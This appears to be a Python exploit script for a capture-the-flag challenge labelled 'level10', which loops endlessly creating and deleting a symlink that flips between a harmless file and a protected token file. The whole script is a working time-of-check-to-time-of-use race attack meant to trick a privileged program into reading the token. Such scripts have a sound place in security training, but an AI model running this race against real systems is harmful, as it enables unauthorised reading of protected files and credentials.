import os
import time


symlink_path = "symlink"
token_file = "/home/user/level10/token"
harmless_file = "harmless_file"


while True:
    try:
        # Point to the harmless file
        os.symlink(harmless_file, symlink_path)
        os.remove(symlink_path)
        
        # Point to the token file
        os.symlink(token_file, symlink_path)
        os.remove(symlink_path)
    except FileExistsError:
        # Symlink might already exist, skip
        pass
    except Exception as e:
        print(f"Error: {e}")
        break

